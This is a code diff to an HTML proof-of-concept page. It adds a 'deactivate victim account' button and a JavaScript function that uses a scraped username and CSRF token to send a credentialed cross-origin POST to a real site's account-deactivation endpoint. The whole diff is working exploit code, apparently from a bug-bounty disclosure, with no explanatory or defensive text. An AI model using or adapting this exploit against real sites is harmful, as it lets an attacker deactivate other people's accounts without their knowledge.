@@ -10,6 +10,7 @@
   <div id="demo3"></div>
 <button type="button" onclick="get_csrf_token()">Get csrf to deactivate victim account!!!</button>
   <div id="demo4"></div>
+<button type="button" onclick="deactivate()">Now deactivate victim account!!!</button>
 </div>
 
 <script>
@@ -47,6 +48,22 @@ function get_csrf_token(){
   xhttp.open("GET", url, true);
   xhttp.withCredentials = true;
   xhttp.send();
+}
+  
+function deactivate(){
+  var xhttp = new XMLHttpRequest();
+    xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+          alert(http.responseText);
+    }
+  };
+  var username = document.getElementById("demo3").innerText;
+  var csrf = document.getElementById("demo4").innerText;
+  var param  = "csrfmiddlewaretoken=" + csrf.replace("csrf for deactivate account : ","") + "&deactivate_reason=1&deactivate_other_message=&deactivate_consent=on&submit=Deactivate+my+account"
+  var url = "https://www.hackerearth.com/deactivate/" + username.replace("Username: ","");;
+  xhttp.open("POST", url, true);
+  xhttp.withCredentials = true;
+  xhttp.send(param);
 }
   
 </script>
